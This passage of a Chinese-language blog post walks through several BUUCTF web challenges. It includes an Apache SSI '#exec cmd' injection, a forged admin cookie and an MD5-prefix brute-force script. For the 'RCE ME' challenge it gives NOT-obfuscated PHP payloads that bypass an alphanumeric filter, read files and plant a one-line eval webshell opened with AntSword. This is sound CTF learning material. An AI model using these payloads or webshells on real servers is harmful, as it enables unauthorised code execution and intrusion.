</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$content</span> <span class="o">=</span> <span class="nx">uniqid</span><span class="p">()</span><span class="o">.</span><span class="nv">$random</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Type: text/html;charset=utf-8&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="o">***</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$admin</span> <span class="o">=</span> <span class="s1">&#39;6d0bc1&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$admin</span> <span class="o">==</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]),</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_shtml</span> <span class="o">=</span> <span class="s2">&#34;public/&#34;</span><span class="o">.</span><span class="nx">get_hash</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34;.shtml&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$shtml</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$file_shtml</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Unable to open file!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$text</span> <span class="o">=</span> <span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">            ***
</span></span></span><span class="line"><span class="cl"><span class="s1">            ***
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h1&gt;Hello,&#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            ***
</span></span></span><span class="line"><span class="cl"><span class="s1">			***&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$shtml</span><span class="p">,</span><span class="nv">$text</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">fclose</span><span class="p">(</span><span class="nv">$shtml</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">***</span>
</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="s2">&#34;[!] Header  error ...&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="o">***</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="o">***</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><div class="highlight" id="id-25"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span> 
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100000000</span><span class="p">):</span> 
</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> 
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;6d0bc1&#39;</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span></span></span></code></pre></div><p>发过去之后：public/dc64a1535c94b7babc55ab528fea462c46e94e90.shtml</p>
<p>然后回显</p>
<pre tabindex="0"><code>Hello,6d0bc1

data: Tuesday, 05-Oct-2021 10:58:18 UTC

Client IP: 117.152.88.50</code></pre><p>感觉是xff，但是没用，看wp说是《Apache SSI远程命令执行漏洞》</p>
<p>在username写<code>&lt;!--#exec cmd=&quot;ls&quot;--&gt;</code>，然后在response给的链接打开。</p>
<p>慢慢找就找到flag了。</p>
<h2 id="0x3bbsidescf-2019futurella" class="heading-element">
  <a href="#0x3bbsidescf-2019futurella" class="heading-mark"></a>0x3B.[BSidesCF 2019]Futurella</h2><p>&hellip;.也不知道想考啥，进去就有flag</p>
<h2 id="0x3cgyctf2020flaskapp" class="heading-element">
  <a href="#0x3cgyctf2020flaskapp" class="heading-mark"></a>0x3C.[GYCTF2020]FlaskApp</h2><div class="highlight" id="id-27"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/decode&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;text&#39;</span><span class="p">)</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;text&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">text_decode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="s2">&#34;结果 ： </span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">text_decode</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">waf</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;no no no !!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;decode&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span>  <span class="n">render_template_string</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span></span></span></code></pre></div><h2 id="0x3dbsidescf-2019kookie" class="heading-element">
  <a href="#0x3dbsidescf-2019kookie" class="heading-mark"></a>0x3D.[BSidesCF 2019]Kookie</h2><p>提示：</p>
<pre tabindex="0"><code> Log in as admin!

We found the account cookie / monster </code></pre><p>构造：</p>
<pre tabindex="0"><code>Cookie: username=admin</code></pre><h2 id="0x3e极客大挑战-2019rce-me" class="heading-element">
  <a href="#0x3e%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019rce-me" class="heading-mark"></a>0x3E.[极客大挑战 2019]RCE ME</h2><p>审计：</p>
<div class="highlight" id="id-30"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$code</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">40</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                                        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;This is too Long.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z0-9]+/&#34;</span><span class="p">,</span><span class="nv">$code</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                                        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;NO.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ?&gt;
</span></span></span></code></pre></div><p>正则可视化：</p>
<p><img loading="lazy" src="/posts/buu-web-0x30-0x3f/image-20220405231609674.png" alt="image-20220405231609674" srcset="/posts/buu-web-0x30-0x3f/image-20220405231609674.png?size=small, /posts/buu-web-0x30-0x3f/image-20220405231609674.png?size=medium 1.5x, /posts/buu-web-0x30-0x3f/image-20220405231609674.png?size=large 2x" data-title="image-20220405231609674" style="--width: 584px;--aspect-ratio: 584 / 347;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>异或或者去取反绕过</p>
<div class="highlight" id="id-31"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s1">&#39;phpinfo&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">payload:
</span></span></span><span class="line"><span class="cl"><span class="err">?code=(~%8F%97%8F%96%91%99%90)();
</span></span></span></code></pre></div><p><img loading="lazy" src="/posts/buu-web-0x30-0x3f/image-20220405233218476.png" alt="image-20220405233218476" srcset="/posts/buu-web-0x30-0x3f/image-20220405233218476.png?size=small, /posts/buu-web-0x30-0x3f/image-20220405233218476.png?size=medium 1.5x, /posts/buu-web-0x30-0x3f/image-20220405233218476.png?size=large 2x" data-title="image-20220405233218476" style="--width: 1240px;--aspect-ratio: 1240 / 413;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>禁用了很多函数，</p>
<p>可以使用scandir和readfile：</p>
<div class="highlight" id="id-32"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//print_r(scandir(&#39;./&#39;))
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s1">&#39;print_r&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s1">&#39;scandir&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">%8F%8D%96%91%8B%A0%8D
</span></span></span><span class="line"><span class="cl"><span class="err">%8C%9C%9E%91%9B%96%8D
</span></span></span><span class="line"><span class="cl"><span class="err">payload:
</span></span></span><span class="line"><span class="cl"><span class="err">(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((&#34;/&#34;)));
</span></span></span></code></pre></div><p>之后使用readfile读：</p>
<pre tabindex="0"><code>&lt;?php
echo urlencode(~&#39;readfile&#39;);
?&gt;

//%8D%9A%9E%9B%99%96%93%9A

payload:
flag:(~%8D%9A%9E%9B%99%96%93%9A)((~%D0%99%93%9E%98));
readflag:(~%8D%9A%9E%9B%99%96%93%9A)((~%D0%8D%9A%9E%9B%99%93%9E%98));</code></pre><p>flag是空的，readflag是elf文件：</p>
<p><img loading="lazy" src="/posts/buu-web-0x30-0x3f/image-20220405234450364.png" alt="image-20220405234450364" srcset="/posts/buu-web-0x30-0x3f/image-20220405234450364.png?size=small, /posts/buu-web-0x30-0x3f/image-20220405234450364.png?size=medium 1.5x, /posts/buu-web-0x30-0x3f/image-20220405234450364.png?size=large 2x" data-title="image-20220405234450364" style="--width: 1905px;--aspect-ratio: 1905 / 398;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>传一句话马：</p>
<div class="highlight" id="id-34"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;assert&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="s1">&#39;(eval($_POST[&#34;test&#34;]))&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$d</span><span class="o">=</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$d</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);
</span></span></span></code></pre></div><p>蚁剑连之后并没有权限，有这样一个插件</p>
<p><img loading="lazy" src="/posts/buu-web-0x30-0x3f/image-20220405235340391.png" alt="image-20220405235340391" srcset="/posts/buu-web-0x30-0x3f/image-20220405235340391.png?size=small, /posts/buu-web-0x30-0x3f/image-20220405235340391.png?size=medium 1.5x, /posts/buu-web-0x30-0x3f/image-20220405235340391.png?size=large 2x" data-title="image-20220405235340391" style="--width: 427px;--aspect-ratio: 427 / 273;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="/posts/buu-web-0x30-0x3f/image-20220405235406928.png" alt="image-20220405235406928" srcset="/posts/buu-web-0x30-0x3f/image-20220405235406928.png?size=small, /posts/buu-web-0x30-0x3f/image-20220405235406928.png?size=medium 1.5x, /posts/buu-web-0x30-0x3f/image-20220405235406928.png?size=large 2x" data-title="image-20220405235406928" style="--width: 1198px;--aspect-ratio: 1198 / 940;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>之后就可以运行readflag了。</p>
<h2 id="0x3fmrctf2020套娃" class="heading-element">
  <a href="#0x3fmrctf2020%e5%a5%97%e5%a8%83" class="heading-mark"></a>0x3F.[MRCTF2020]套娃</h2><div class="highlight" id="id-35"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span> <span class="nx">substr_count</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">substr_count</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="s1">&#39;%5f&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Y0u are So cutE!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b_u_p_t&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;23333&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^23333$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b_u_p_t&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;you are going to the next ~&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2021-09-16 00:00:00">更新于 2021-09-16&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/buu-web-0x30-0x3f/" data-title="BUU_WEB刷题_0x30-0x3F"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/buu-web-0x30-0x3f/"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/buu-web-0x30-0x3f/" data-title="BUU_WEB刷题_0x30-0x3F"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/buu-web-0x20-0x2f/" class="post-nav-item" rel="prev" title="BUU_WEB刷题_0x20-0x2F"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>BUU_WEB刷题_0x20-0x2F</a>
      <a href="/posts/io_file/" class="post-nav-item" rel="next" title="IO_FILE调试&#43;详解">IO_FILE调试&#43;详解<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
              <a href="/"></a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
</html>
